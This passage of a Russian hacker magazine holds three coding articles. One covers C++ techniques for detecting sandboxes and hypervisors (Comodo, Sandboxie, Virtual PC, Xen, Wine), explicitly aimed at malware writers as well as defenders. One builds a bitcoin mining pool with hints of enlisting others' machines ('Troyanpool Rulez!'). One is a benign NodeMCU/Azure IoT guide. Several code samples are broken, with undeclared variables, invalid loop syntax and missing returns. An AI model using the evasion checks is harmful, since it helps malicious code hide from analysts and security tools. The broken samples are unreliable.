         clang генерирует впол не шус трый код. В 2013 году кто‐то даже хотел
        сделать пол ноценную игру на QB64 и опуб ликовать ее в «Стиме»,
        но по прошествии пяти лет работы так и не завершены.
         Похоже, бейсик неплохо эво люциони ровал, но сделать на нем
         что‐то прилич ное по‐прежнему непросто.
КОДИНГ
ДЕТЕКТ
ПЕСОЧНИЦЫ
УЧИМСЯ ОПРЕДЕЛЯТЬ,
РАБОТАЕТ ЛИ ПРИЛОЖЕНИЕ
В SANDBOX‐ИЗОЛЯЦИИ





        Nik Zerof
    xtahi0nix@gmail.com





Методы детектирова ния сендбоксов так же востребованы
у разработчиков защит, как и методы антиотладки: если
программа работа ет в изолиро ванной среде, это может
означать, что ее поведение хотят исследовать реверсеры
или вирус ные аналитики, либо это означает, что наша прог‐
рамма изолирована защитными средства ми решений inter‐
net security. Так или иначе, опре деление факта изоляции
программы — полезный навык, который помогает и раз‐
работчикам защит, и вирмейкерам. В этой статье я покажу,
как распознавать sandbox‐изо ляцию и запуск под гипер‐
визорами раз ных типов.


             INFO

                      Sandbox (песочница) — изолирован ная програм‐
                     мная среда, в которой задается и контролируется
                      набор ресурсов для запущенной внутри нее прог‐
                     раммы. Как правило, ограничиваются и фильтру‐
                      ются вызовы WinAPI, которые отве чают за доступ
                          к оборудованию, процессорным ядрам, опре‐
                       деление размера памяти, а так же доступ к сети
                      и привилегированным средствам операционной
                       системы.  Сендбок синг   часто   использует ся
                       для запуска небезопасного кода и для анализа
                       программ.



ПРОВЕРЯЕМ ЗАПУЩЕННЫЕ ПРОЦЕССЫ
Если виды песоч ниц нам приблизитель но известны, то это облегчит детек‐
тирование. Можно прос то поискать сендбоксы в спис ке выполняющихся про‐
цессов. Для этого используем функцию, которая перечислит все процессы
и определит PID нужного по названию.


DWORD getPIDproc(char * pProcName)
{
    HANDLE pHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(pHandle == NULL) return 0;
    PROCESSENTRY32 ProcessEntry;
    DWORD pid;
    ProcessEntry.dwSize = sizeof(ProcessEntry);
    bool Loop = Process32First(pHandle, &ProcessEntry);
    if(Loop == NULL) return 0;
    while (Loop)
    {
        if (strstr(ProcessEntry.szExeFile, pProcName))
        {
        pid = ProcessEntry.th32ProcessID;
            CloseHandle(pHandle);
            return pid;
        }
        Loop = Process32Next(pHandle, &ProcessEntry);
    }
    return 0;
}

Детект песочницы Comodo Internet Security:


if(getPIDproc("cmdvirth.exe")) std::cout << "Comodo sandbox detected!
\n";

Процесс cmdvirth.exe обеспечивает виртуализацию в Comodo Internet Se‐
curity. По тому же принципу можно задетектить песочницу Sandboxie:


if(getPIDproc("SbieSvc.exe")) std::cout << "Sandboxie detected!\n";

Я думаю, что прин цип понятен. :‐) Если про цесс не будет найден, функция
вернет 0, и условие if не будет выполнено. Также функция вернет 0, если
возникнут проблемы с получением первого процес са в системном снапшоте
функцией Process32First либо с получением самого снапшота функцией
CreateToolhelp32Snapshot.


ПРОВЕРЯЕМ ПОДКЛЮЧЕННЫЕ МОДУЛИ В НАШЕМ АДРЕСНОМ
ПРОСТРАНСТВЕ
Другая инте ресная идея — просмотреть подклю ченные модули в адресном
пространстве нашей программы на предмет извес тных модулей песочниц.
Сделаем это напрямую из нашего процес са при помощи WinAPI‐функции
GetModuleHandle:


BOOL checkLoadedDll(LPCWSTR pDllName)
{
    HMODULE hDll = GetModuleHandle(pDllName);
    if(hDll) return TRUE;
}

Проверка на песочницу Comodo Internet Security:


if (checkLoadedDll(L"cmdvrt64.dll")) std::cout << "Comodo sandbox
detected!\n";

Или проверим на Sandboxie:


if (checkLoadedDll(L"sbiedll.dll")) std::cout << "Sandboxie detected!
\n";

Функция GetModuleHandle() проверяет наличие DLL в адресном пространс‐
тве вызывающего процесса. Если функция не находит модуль, то возвращает
ноль, условие не срабатывает.
   Чтобы узнать список подключенных модулей в стороннем процессе, нужно
получить его хендл, вызвав функцию WinAPI OpenProcess, затем перечислить
все подключенные к про цессу модули с помощью функции EnumProcessMod‐
ules (в нее сле дует передать полученный хендл) и, наконец, получить наз‐
вание модуля с помощью функции WinAPI GetModuleFileNameEx.


ЧЕЛОВЕЧЕСКИЙ ФАКТОР
Что  делать, если мы не знаем даже примерно,  какая именно  прог‐
рамма‐песочница будет использована? Надо сказать, что очень сложно
на 100% задетектить гра мот но написанную песочницу, ведь она будет
работать на уровне ядра, может пря тать все свои процессы, подключенные
модули, может даже скрывать собственный драйвер. Техники, которые будут
перечислены далее, я рекомендую использовать по принципу экспертной
системы для анализа результатов: чем больше будет срабаты ваний, тем
более вероятно, что мы находимся в изолированной среде.
  Первый спо соб  кос венного обнаружения  sandbox‐изоляции основан
на человеческом поведении. Мы допускаем, что пос ле запуска нашей прог‐
раммы указатель мыши перемещался, и если это происходит, то можно пред‐
положить, что песочница не используется. Сравним координаты указателя
через некоторый промежуток времени: если координаты не меняются, можно
ставить один балл в пользу того, что нас исследуют внутри песочницы.


BOOL mouse_motion()
{
    int count = 0;
    POINT mouse_coordinate1 = {};
    POINT mouse_coordinate2 = {};
    GetCursorPos(&mouse_coordinate1);
    Sleep(1500);
    GetCursorPos(&mouse_coordinate2);
    if ((mouse_coordinate1.x == mouse_coordinate2.x) &&
        (mouse_coordinate1.y == mouse_coordinate2.y))
        ++count;
    GetCursorPos(&mouse_coordinate1);
    Sleep(1500);
    GetCursorPos(&mouse_coordinate2);
    if ((mouse_coordinate1.x == mouse_coordinate2.x) &&
        (mouse_coordinate1.y == mouse_coordinate2.y))
        ++count;
    if(count > 0) return TRUE;
        else return FALSE;
}

В этой функции мы берем два отрезка времени по полторы секунды каждый и,
если в каком‐то отрезке времени не было перемещения указателя мыши,
делаем вывод, что, скорее всего, выполнение идет под бдительным взором
изолированной среды.


PEB -> NUMBEROFPROCESSORS
Изолированные среды часто усекают число процессоров, чтобы не занять
все ресурсы компьюте ра. Например, песочница может эмулировать одно‐
ядерный процессор. Но на дворе 2018 год, и даже в мобильных гаджетах
зачастую камни с четырь мя ядра ми, так что смело можем проверять, сколько
ядер процессора видит наша программа. Если ядро всего одно, то это повод
для подозрений.
  Код для архитектуры x64:


PULONG procNum = (PULONG)(__readgsqword(0x60) + 0xB8);   // DWORD
NumberOfProcessors;

Для x86:


PULONG procNum = (PULONG)(__readfsdword(0x30) + 0x64);   // DWORD
NumberOfProcessors;

Этот код получает содержимое поля NumberOfProcessors из PEB (Process
Environment Block). Теперь лег ко проверить число процессоров:


if (*procNum < 2)  std::cout << "NumberOfProcessors == 1, may be
sandboxed!\n";


ВЫЯСНЯЕМ РАЗМЕР ОПЕРАТИВНОЙ ПАМЯТИ
Другой побочный признак сендбоксинга — это малое количество оператив‐
ной памяти. В наши дни редко можно увидеть ПК с одним‐двумя гигабайтами
оперативки, теперь это скорее нормальный объем для смартфонов. Вот
как будет выглядеть реализация проверки.


BOOL check_memory()
{
    MEMORYSTATUSEX mem_stat = { 0 };
    statex.dwLength = sizeof(mem_stat);
    GlobalMemoryStatusEx(&mem_stat);
    if(mem_stat.ullTotalPhys < (1024LL * (1024LL * (1024LL * 1LL))))
return TRUE;
    else return FALSE;
}


ПРОВЕРЯЕМ СВОБОДНОЕ МЕСТО
Мало места на жестком диске? Воз можно, и правда все забито под завязку,
но есть вероятность того, что это очередной признак песочницы. В этом при‐
мере мы предполагаем, что программа работает в изоляции, если дос тупно
меньше 30 Гбайт.


BOOL check_freespace()
{
    LPCWSTR lpDirectoryName = NULL;
    ULARGE_INTEGER lpTotalNumberOfBytes;
    BOOL bStat = GetDiskFreeSpaceEx(lpDirectoryName, NULL, &lpTota
lNumberOfBytes, NULL);
    if (bStat)
    {
        if (lpTotalNumberOfBytes.QuadPart < (30ULL * (1024ULL * (
1024ULL * (1024ULL)))))
            return TRUE;
        else return FALSE;
    }
}


ПРОСТЫЕ ТАЙМИНГ-АТАКИ
Песочницы зачастую весь ма требовательны к ресурсам и нередко сильно
замедляют работу прог раммы. Мы можем использовать  тайминг‐атаки
для того, чтобы понять, используется эмуляция обо рудования или нет. Один
из вариантов — выпол нять какой‐нибудь системный вызов, который на чис той
системе будет работать моментально, а в эму лируемой среде замед лен
из‐за драйвера песоч ницы. Если разница велика, то можно предположить,
что используется песочница. На такой трюк ловится, например, песочница
Sandboxie.


BOOL checkTiming1()
{
    unsigned __int64 counter1, counter2, counter3;
    int i = 0;
    do
    {
        counter1 = __rdtsc();
        GetProcessHeap();
        counter2 = __rdtsc();
        CloseHandle(0);
        counter3 = __rdtsc();
        // Замеряем отношение времени выполнения CloseHandle и GetPro
cessHeap()
        if ( ( LODWORD(counter3) ‐ LODWORD(counter2) ) /
            ( LODWORD(counter2) ‐ LODWORD(counter1) ) >= 10)
            return TRUE;
    } while (i = 0; i < 10; i++);
    return FALSE;
}

Отношение времени выполнения функции CloseHandle и GetProcessHeap()
должно быть около 1 к 10. Если отно шение меньше, делаем вывод о наличии
фильтрации вызовов в драйвере песочницы.
   Также песочницы могут оптимизировать течение времени — например,
игнорировать вызовы функции Sleep(). Если сделать замеры времени
выпол нения до вызова Sleep() и пос ле, то мы это увидим.


BOOL check_sleep()
{
    // Инициализируем пустые метки
    DWORD counterStart = 0;
    DWORD counterEnd = 0;
    DWORD difference = 0;
    counterStart = GetTickCount();  // Засекаем время до вызова
Sleep();
    Sleep(100000); // Засыпаем на 100 секунд
    counterEnd = GetTickCount();  // Проверяем время после вызова
    difference = counterEnd ‐ counterStart;  // Сравниваем временные
интервалы
    if difference > 99000) // Корректируем на одну секунду, допуская
погрешность
        return FALSE;
    else    return TRUE;
}


БЫСТРЫЙ ДЕТЕКТ ГИПЕРВИЗОРОВ
Мы рассмотрели детектирование известных и неиз вестных программ‐песоч‐
ниц, но нельзя ли определить гипервизор? Здесь нам поможет инструкция
__cpuid. Она запрашива ет у процес сора его тип и функции, которые он под‐
держивает. На выходе мы получа ем заполненную структуру cpuInfo, которая
состоит из четырех чисел, передаваемых в регистрах процессора EAX, EBX,
ECX и EDX. На вход нужно подать чис тую структуру cpuInfo и чис ло func‐
tion_id, которое говорит команде, какая именно информация нас интересу‐
ет. Функция поддерживает как x64‐, так и x86‐архитектуры. Ее прототип выг‐
лядит следующим образом:


void __cpuid(
    int cpuInfo[4],
    int function_id
);

Если передать число 1 в поле function_id и посмотреть, выставлен ли 31‐й
бит в регистре ECX структуры cpuInfo, то можно узнать о присутс твии гипер‐
визора. Итак, код:


BOOL check_cpuid()
{
    INT cpuInfo[4] = { ‐1 }; // Объявляем структуру cpuInfo и
инициализируем ее
    __cpuid(cpuInfo, 1); // Запрашиваем данные
    if ((cpuInfo[2] >> 31) & 1)
        return TRUE; // Проверяем нужный бит в структуре cpuInfo
}

Помимо это го, известные гипер визоры детектиру ются так же, как и песоч‐
ницы: можно просто посмотреть их про цес сы или характерные записи в реес‐
тре. Давай попробуем задетектить гипервизор Virtual PC при помощи фун‐
кции,  которую  мы  написали  выше, —  DWORD  getPIDproc(char  *
pProcName). Просто передадим в нее имя нужных процессов, характерных
для Virtual PC:


if(getPIDproc("VMSrvc.exe") || getPIDproc("VMUSrvc.exe")) std::cout <
< "Virtual PC detected!\n";

Так же легко найдем гипервизор Citrix Xen:


if(getPIDproc("xenservice.exe")) std::cout << "Citrix Xen detected!\n
";

Теперь посмотрим, как задетектить гипервизоры по характерным записям
в реестре. Для это го напишем небольшую функцию, которая поможет нам
определить, что программа исполняется внутри Wine.


BOOL check_wine_registry_key()
{
    HKEY phkResult = FALSE;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Wine"), NULL,
KEY_READ, &phkResult) == ERROR_SUCCESS)
        {
            RegCloseKey(phkResult);
            return TRUE;
        }
 };


ЗАКЛЮЧЕНИЕ
Вот мы и разобрали, как определять извес тные изолированные среды раз‐
ными способами. Это не все из возможных методов, но от такого набора
заготовок можно будет отталкивать ся, констру ируя свои методы опре деления
(а возможно, и обхода) сендбоксинга.
КОДИНГ
MINING              gogaworm
                                                                                      Автор рубрики КОДИНГ
                                                                                       журнала «Хакер»
                                                                                        gogaworm@tut.by
         НА JAVAPOOL





      КОДИМ РАСПРЕДЕЛЕННЫЙ
          БИТКОЙН‐МАЙНЕР





Падение курса Bitcoin привело к тому, что даже в нашей
холодной стране с дешевым электричеством майнить стало
значительно менее выгодно. Что остается делать энтузиас‐
там криптовалют? Особо предприимчивые стали привлекать
к расчетам чужие компьютеры и, так сказать, переходить
к распределенным вычислениям.


ВЫБИРАЕМ ВАЛЮТУ И ГОТОВИМ ИНСТРУМЕНТАРИЙ
В качестве криптовалю ты мы выб рали биткойны — из‐за их высокой стоимос‐
ти и относительно хорошей документации. Так как биткойн‐сеть не имеет
централизованного хранилища данных, чтобы с ней работать, нам понадобят‐
ся средства синхронизации с дру гими узлами сети. К счастью, есть готовое
решение — пакет прог рамм Bitcoin Core. Синхронизация с живой сетью
занимает очень много времени и мес та на диске, поэтому для начала раз‐
работки и тестирования лучше использовать тестовую сеть testnet, которую
периодически очищают от информации о транзакциях. Запускаем UI‐при‐
ложение  Bitcoin Core  (testnet) и ждем, пока закончится синхронизация.
В дальнейшем для работы будем пользоваться консольным сервисом
bitcoind.
  Для общения с bitcoind используется протокол JSON‐RPC. Это очень
простой протокол поверх HTTP, поз воляющий вызывать методы сервера,
используя JSON, чтобы задавать имя метода и параметры.
  По умолчанию в целях безопас ности воз можность подключения к bitcoind
отключена. Чтобы ее включить, нужно соз дать файл bitcoin.conf в каталоге
Windows: %APPDATA%\Bitcoin\  (например, C:\Users\username\AppData\
Roaming\Bitcoin\bitcoin.conf) или Linux: $HOME/.bitcoin/ (например, /
home/username/.bitcoin/bitcoin.conf).  Готовый  файл  можно  взять
с GitHub. Находим в нем и редактируем следующие параметры:


# Говорим серверу использовать тестовую сеть, а не настоящую
testnet=1
# Имя пользователя и пароль, конечно же, нужно поменять на сложные
rpcuser=rpcuser
rpcpassword=rpcpassword

Чтобы проверить настройки, можно воспользовать ся готовым клиентом bit‐
coin‐cli. Например, выполнив команду getinfo (пред варительно запустив
bitcoind). Подробное описание всех команд мож но посмотреть тут.





Наш JSON‐RPC‐клиент напишем, используя фреймворк Vert.x, потому что он
простой, код занимает мало места и в нем реализованы все необходимые
нам функции.
   Итак, создаем HTTP‐клиент. Bitcoind использует базовую аутентификацию,
поэтому конвертируем в Base64 строку с логином и паролем.


client = vertx.createHttpClient();
requestOptions = new RequestOptions()
        .setHost(host)
        .setPort(port)
        .setURI("/");
base64Key = Base64.getEncoder().encodeToString((user + ':' + password
).getBytes());

Пишем прос той метод для вызова методов bitcoind. Будем передавать в него
команду в JSON‐фор мате и handler, чтобы реагировать на полученный ответ
от сервера.


private void executeRpc(String command, final Handler<Buffer> handler
) {
    client
        .post(requestOptions, result ‐> {
            if (result.statusCode() == 200) {
                result.bodyHandler(handler);
            } else {
                System.out.println("Failed do post because " + result
.statusMessage());
            }
        })
        .putHeader(HttpHeaders.CONTENT_TYPE, "application/json")
        .putHeader(HttpHeaders.AUTHORIZATION, "Basic " + base64Key)
        .putHeader(HttpHeaders.CONTENT_LENGTH, String.valueOf(command
.length()))
        .write(command)
        .end();
}

Основные команды, которые нам понадобятся, — это получить работу
и отправить работу. Но прежде чем приступать к их реализации, рассмотрим
подробнее процесс майнинга. Как извес тно, биткойн базиру ется на цепочке
блоков, в которых хранится информа ция обо всех транзакциях. Каждый блок
состоит из заголовка и списка транзакций. Задача майнера — получить хеш
заголовка блока, значение которого меньше заданного. За это он вознаграж‐
дается некоторой суммой криптоденег.
  Заголовок состоит из нескольких полей:
 • версия (определяет версию валидации блока),
 • хеш заголовка предыдущего блока,
 • корень Меркле (хеш всех транзакций, включенных в блок),
 • время создания блока,
 • bits (закодированная версия заданного максимального значения хеша
   блока),
 • nonce (произволь ное значение).





                      Рас шифровка заголовка

Всю эту информацию позволяет получить команда getblocktemplate.


executeRpc(new JsonObject(ImmutableMap.of(
        "id", "1",
        "method", "getblocktemplate",
        "params", "",
        "jsonrpc", "1.0")).toString(), buffer ‐> {
    createJobData(buffer.toJsonObject());
});

В результате получим JSON‐объект.


{
  "result": {
    "version": <версия блока>,
    "previousblockhash": "<хеш предыдущего блока>",
    "transactions": [ <транзакции, которые нужно включить в блок>
      {
        "data": "<данные транзакции>",
        "hash": "<хеш транзакции, который понадобится для построения
корня Меркле>",
        "fee": <разница в биткойнах между входами и выходами>,
        ...
      }
      ...
    ],
    "coinbaseaux": { <данные, которые нужно включить в скрипт
транзакции генерации новых денег>
      "flags": ""
    },
    "coinbasevalue": <максимальная награда за майнинг этого блока>,
    "target": "<целевое значение для хеша блока>",
    "mintime": <минимальное возможное время создания блока>,
    "mutable": [ <изменяемые поля>
      "time",
      "transactions",
      "prevblock"
    ],
    "noncerange": "<допустимый диапазон nonce>",
    "curtime": <время создания блока>,
    "bits": "<упакованное значение target>",
    "height": <высота текущего блока>
  },
  "error": null,
  "id": "1"
}

Чтобы добиться нужного зна чения хеша заголовка, майнер может менять
nonce и время создания бло ка (в огра ниченном диапазоне). Размерность
nonce и ограничения на изменения времени создания блока приводят к огра‐
ниченному диапазону перебо ра воз можных значений. Чтобы его увеличить,
предусмотрена возможность изменения транзакций, в результате чего меня‐
ется корень Меркле, увеличивая тем самым варианты перебора. Задача
пула — распределить работу между майнерами таким образом, чтобы их
работа не дублировалась.
  Первой транзакцией в блоке обычно идет так называемая coinbase‐тран‐
закция, которая отвечает за генера цию новых денег. Она отличается от обыч‐
ной транзакции тем, что не имеет входа, описывающего, откуда пришли день‐
ги. Кроме того, в каждой транзакции есть поля scriptPubKey и scriptSig. В них
содержится  небольшая  программа  на  языке  Script,  которая  отвечает
за валидацию транзакции. Чтобы транзакция счи талась валидной, вызывается
сначала scriptSig из старой транзакции, а затем scriptPubKey из новой тран‐
закции. Если выпол нение успешно, то транзакция считается валидной. Так
как в coinbase‐транзакции нет вхо дящей транзакции, то поле scriptSig называ‐
ется coinbase и в него мож но писать любую информа цию. Этим и пользуются
пулы, чтобы увеличить диапа зон перебираемых значений.





               Описание полей coinbase‐транзакции

Разработчики Bitcoin немного перемудрили с представлением данных — то
прямой, то обратный порядок байтов, поэтому, чтобы не сойти с ума, вос‐
пользуемся для генерации coinbase‐транзакции Java‐библиотекой bitcoinj.


TestNet3Params params = TestNet3Params.get(); // Используем тестовую
сеть
byte[] pubKeyTo = (new ECKey()).getPubKey(); // Тут должен быть
валидный кошелек пула
Coin coin = Coin.valueOf(blocktemplate.getJsonObject("result").
getLong("coinbasevalue"));
int height = blocktemplate.getJsonObject("result").getInteger(
"height");
String coinbaseauxFlags = blocktemplate.getJsonObject("result").
getJsonObject("coinbaseaux").getString("flags");
byte[] extranonce = new byte[8];
String message = "Troyanpool Rulez!";
byte[] coinbase = generateCoinbaseTransaction(params, height, extran
once, message, pubKeyTo, coin).bitcoinSerialize();
private Transaction generateCoinbaseTransaction(NetworkParameters
params, int height, String coinbaseauxFlags, byte[] extranonce,
String message, byte[] pubKeyTo, Coin value) {
    Transaction coinbase = new Transaction(params);
    ScriptBuilder inputBuilder = new ScriptBuilder();
    inputBuilder.number((long)height);
    byte[] coinbseauxFlagsData = isNotEmpty(coinbaseauxFlags) ?
coinbseauxFlagsData = HEX.decode(coinbaseauxFlags) : new byte[0];
    byte[] messageData = message.getBytes();
    byte[] data = new byte[coinbseauxFlagsData.length + extranonce.
length + messageData.length];
    if (coinbseauxFlagsData.length > 0) {
        System.arraycopy(coinbseauxFlagsData, 0, data, 0, coinbs
eauxFlagsData.length);
    }
    System.arraycopy(extranonce, 0, data, coinbseauxFlagsData.length,
 extranonce.length);
    System.arraycopy(messageData, 0, data, coinbseauxFlagsData.length
 + extranonce.length, messageData.length);
    inputBuilder.data(data);
    coinbase.addInput(new TransactionInput(params, coinbase, inputB
uilder.build().getProgram()));
    coinbase.addOutput(new TransactionOutput(params, coinbase, value,
 ScriptBuilder.createOutputScript(ECKey.fromPublicOnly(pubKeyTo)).
getProgram()));
    return coinbase;
}

Для удобства майнеров (что бы им лишний раз не делать вычисления) раз‐
делим coinbase‐транзакцию на три час ти: coinbase1, extranonce, coinbase2.





Осталось обеспечить канал связи с майнерами. Для этого воспользуемся
протоколом Stratum. Он базируется на TCP/IP‐сокетах, через которые гоня‐
ются данные в формате JSON. Создадим обработчик соединения с май‐
нерами.


vertx.createNetServer().connectHandler(netSocket ‐> {
    // Конец команды обозначается символом перевода каретки
    RecordParser parser = RecordParser.newDelimited("\n", netSocket);
    parser
            .endHandler(v ‐> netSocket.close())
            .exceptionHandler(throwable ‐> {
                throwable.printStackTrace();
                netSocket.close();
            })
            .handler(buffer ‐> {
                String inputCommand = buffer.toString("UTF‐8");
                processCommand(new JsonObject(inputCommand));
            });
}).listen(33333);

Протокол требует авториза ции майнеров, а так как наши майнеры не совсем
люди и никак не могут зарегистрировать ся, можно логин генерировать,
пароль же либо зашить в исходный код майнера, либо вычис лять по извес‐
тному пулу и майнеру алгоритму. Подробнее о протоколе Stratum можно по‐
читать тут. Чтобы гарантированно рас пределять уникальную часть работы
каждому майнеру, разделим extranonce на две части и в первой будем прос‐
тавлять счетчик майнеров, а вторую разрешим изменять.


// Сохраним информацию о майнере
Miner miner = new Miner(netSocket);
miner.setExtranonce1(minerCounter++);

Информацию об extranonce и уникальный идентификатор подписки отправ‐
ляем клиенту в ответ на команду mining.subscribe:


if (command.getString("method").equalsIgnoreCase("mining.subscribe"))
 {
    String answer = "{\"jsonrpc\":\"2.0\",\"result\":[[\"mining.
notify\",\"" + subscriptionId + "\"],\""
        + extraNonce1 + "\"," + extraNonce2.length + "],\"id\":1}";

Сформируем задание для майнера.


{
 "params":
  ["<идентификатор задания>",
  "<хеш предыдущего блока>",
  "<coinbase1>",
  "<coinbase2>",
  ["<хеш транзакции 1>", ... "<хеш транзакции х>"],
  "<версия>",
  "<bits>",
  "<время создания блока>",
  <если true, то необходимо переключиться на новую задачу>],
  "id": "1", "method": "mining.notify"
}

Когда майнер найдет решение, он пришлет вторую часть extranonce, вре мя
создания блока и nonce. Пулу необходимо соб рать новый блок и отправить
его в bitcoin‐сеть.


TestNet3Params params = TestNet3Params.get(); // Используем тестовую
сеть
 // Не забываем добавить coinbase‐транзакцию
transactions.add(generateCoinbaseTransaction(params, height, extran
once, message, pubKeyTo, coin));
Block block = new Block(params, blockVersion, prevBlockHash, merkel
Root, ntime, difficulty, nonce, transactions);
byte[] blockBytes = block.bitcoinSerialize();
executeRpc(new JsonObject(ImmutableMap.of(
        "id", "1",
        "method", "submitblock",
        "params", HEX.encode(blockBytes),
        "jsonrpc", "1.0")).toString(), buffer ‐> {
    JsonObject result = buffer.toJsonObject();
    if (result.getString("result") == null) {
        System.out.println("Блок успешно вставлен!");
    }
});

Когда блок успешно добавлен, нужно уведомить всех клиентов об отмене
работы над этим блоком. Для это го используем шину событий.


// Сервер подписывается на события
vertx.eventBus().consumer("miner.notify", message ‐> {
    for (Miner miner : miners) {
        miner.getSocket().write(message.body().toString());
    }
});
...
// Планировщик заданий отправляет уведомление о новой работе
vertx.eventBus().publish("miner.notify", jobNotification);


ВУАЛЯ!
Наш проект завершен. Осталось добавить обработку ошибок, и можно
начинать майнить. Однако помни, что пул для май нинга тре бует хорошего
канала и довольно много места на диске. И не забудь пре дупредить об этих
ограничениях друзей, которые добровольно сог ласятся тебе помочь в май‐
нинге криптовалюты, ведь ты не хочешь ненароком их огорчить? :)
КОДИНГ
ПРЫЖОК
В ОБЛАКО





 Алексей Соммер
asommer@yandex.ru



    СТРОИМ БЮДЖЕТНОЕ РЕШЕНИЕ
        ДЛЯ ИНТЕРНЕТА ВЕЩЕЙ
      НА NODEMCU + AZURE IOT HUB




Самое популярное назначение IoT‐устрой ств — это сбор
 телеметрии. На сегодняшний день цены на облачные IoT‐
сервисы снизились буквально до одного доллара в месяц,
 который, согласись, не жалко отдать даже просто ради
 эксперимента.  :) В этой статье я расскажу, как отправить
данные в облако с платы NodeMCU, используя язык Lua.
Для создания облачной части я использовал Azure Functions
и Table Storage, но мой PoC для NodeMCU и языка Lua можно
использовать и с другими про вайдерами облачных  IoT‐
решений.


             INFO

                   NodeMCU  от  Expressif —  это одна из самых
                       недорогих плат с Wi‐Fi, microUSB и программа‐
                       тором на борту. Она создана на базе модуля ES‐
                        P8266. Плату  второго поколения можно  при‐
                        обрести приб лизительно за 6–7 долларов. С пла‐
                        той можно работать из Arduino IDE. Кроме того,
                        плата  под держивает  скрип товый  язык  Lua
                        (переводится с португальского как «Луна»).



ПОДКЛЮЧЕНИЕ И НАСТРОЙКА ДЕВАЙСА
 Для того чтобы под Windows девайс распознал ся, нужно скачать драйвер
 по следующей ссылке: CP210x USB to UART Bridge VCP Drivers.
   Стандартная   скорость   последова тельного   порта  NodeMCU —
 это 115 200 бит/с. Ты можешь уста новить другую скорость, но при первом же
 сбросе устройства она вернется к 115 200. Важно, чтобы драйверу была
 установлена точно такая же скорость.





                       Свойства драй вера


ПРОШИВКА
 Скорее всего, в первоначальной про шивке чего‐то будет не хватать, поэтому
 в идеале нужно прошить устройство самостоятель но. Собрать образ Firmware
 можно несколькими способами: с помощью об лачного сервиса, об раза
 Docker’а или исполь зуя инс трукцию для Linux.
   Я собирал с помощью облачно го сервиса, что и всем советую. :)
   Если нужно отправить данные в облако, то понадобится выбрать SNTP,
 MQTT, HTTP (Wi‐Fi, timer, ﬁle, GPIO, net, node, UART уже выбраны по умол‐
 чанию). Также сле дует пометить в качестве необ ходимого TLS/SSL support
 в пункте Miscellaneous options. Ссылка с bin‐файлом при ходит на почту. Точ‐
 нее сказать, приходят даже сразу две ссылки. Одна с образом, поддержи‐
 вающим операции с плавающей запятой, и вторая с не поддерживающим.
   Перед прошивкой ESP8266 необходимо привести в особый режим.
 На плате имеется отдельная кнопка FLASH. Ее нажатие во вре мя включения
 питания или нажатия reset переводит девайс в режим bootloader. Если вдруг
 в твоей модификации платы такой кнопки нет, то перед прошивкой нужно
 соединить GPIO0 с GND и нажать reset (этот способ подходит для ESP‐12).
 Прошить Firmware можно утилитой PyFlasher. Py в наз вании означает, что при‐
 ложение написано на Python. Есть еще nodemcu‐ﬂasher, но она давно уже
 не обновлялась. Ее я не пробовал.
   Окно PyFlasher выглядит так:





                                  PyFlasher

 Flash mode выбирается в зависимости от того, какая у нас плата. Большинс‐
 тву современных плат на базе модулей ESP8266 ESP‐12 и ESP32 подходит
 режим DIO, ESP8266 от 01 до 07 — более быстрый режим QIO. DOUT исполь‐
 зуется ESP8285.


НАСТРОЙКА IDE
 Скачиваем бесплатную IDE по ссылке ESPlorer. В качестве альтернативы есть
 ZeroBrane Studio. Мне больше всего по душе пришел ся ESPlorer, поэтому
 приведу пример работы именно с ним.
    ESPlorer написан на JAVA. Интерфейс приложения такой.





                                   ESPlorer

С левой стороны код, настройки и подобное. С пра вой — окно мониторинга
 и команды управления девайсом. Открываем при ложение, выбираем порт.
 Устанавливаем скорость, на которой будет происходить обмен (вероятнее
 всего, это 115 200), и нажимаем Open.





                  Установка ско рости порта в ESPlorer

 Для разминки можно запустить прос той скрипт, который мигает встроенным
 светодиодом:


 LED = 0
 gpio.mode(LED, gpio.OUTPUT)
 function flash_led()
  gpio.write(LED, gpio.LOW)
  tmr.delay(500000)
  gpio.write(LED, gpio.HIGH)
 end
 tmr.alarm(1, 1000, tmr.ALARM_AUTO, flash_led)

 Если на нашей плате нет встроенного светодиода (или тебе уже вконец надо‐
 ели примеры моргания светодиодом), то можно попробовать выполнить
 еще более простой скрипт, который выводит на экран строку:


 print("Hello from Lua!")

 После того как создашь файл формата .lua (допус тим, test.lua), вне сешь
 в него код и сох ранишь на диск, можно будет загрузить его на устройство.
 Для этого необходимо открыть порт, если он не открыт (кнопка Open),
 и нажать кнопку Upload. Ее можно найти среди кнопок, которые расположены
 под кодом (слева).
   Загрузив файл, выполним его, отправив команду


 dofile("test.lua")

 Команду можно ввести вручную в нижнее поле, расположенное справа
 под монитором. Особо ленивые, а точнее — рациональные программисты
 могут нажать кнопку Reload (крайний ряд кнопок справа). Появится список
 кнопок с загруженными на плату файлами .lua. Нажатие на кнопку с именем
 файла запустит файл на исполнение.
   Если хочешь, чтобы файл запус кался сразу пос ле включения платы, то соз‐
 дай файл с именем AUTOEXEC.BA… тьфу, то есть init.lua. :)


НАСТРОЙКА ОБЛАЧНОЙ ЧАСТИ ДЛЯ РАБОТЫ С УСТРОЙСТВОМ
 Оставим на какое‐то время наше устройство и соз дадим его двойник в обла‐
 ке. С недавних пор двойник устройства можно соз дать прямо на портале
 Azure, воспользовавшись новыми воз можнос тями. В группе настроек IoT‐хаба
 под названием Explorers необходимо выб рать IoT Devices и нажать + Add.
   Для подклю чения устройства к IoT‐хабу нам необходимо сгенерировать
 SAS (shared access signature). Для генерации SAS используется ключ двой‐
 ника устройства, который можно получить с помощью вспомогательной ути‐
 литы (Device Explorer, iothub‐explorer, IoT Extension for Azure CLI 2.0). Но проще
 всего получить ключ все там же, на портале Azure, зай дя в IoT Hub → IoT
 Devices.





                                     IoT Explorer

 SAS можно сге нерировать на устройстве, а мож но с помощью своего
 онлайн‐сервиса. В принципе, SDK может сгенерировать SAS автоматически
 (достаточно в коде указать ключ двойника устройства).





                Создание токена с помощью сервиса

 Способ, при котором SAS‐токен генери руется веб‐сервисом на ограничен‐
 ное время, чуть более безопа сен. Хотя существу ет и определенный нюанс.
 Если отправлять сервису только имя устрой ства, то злоумышленник может
 перебором имен получить токен какого‐то другого устрой ства. Поэтому, что‐
 бы немного обезопасить процесс, предлагаю такое решение: сохраним
 на устройстве хеш Azure‐ключа двойника устройства. И в коде сервиса
 перед генерацией SAS проверим, совпадает ли хеш с хешем ключа устрой‐
 ства. Таким образом, получить SAS можно будет, только зная имя устройства
 и хеш его ключа.
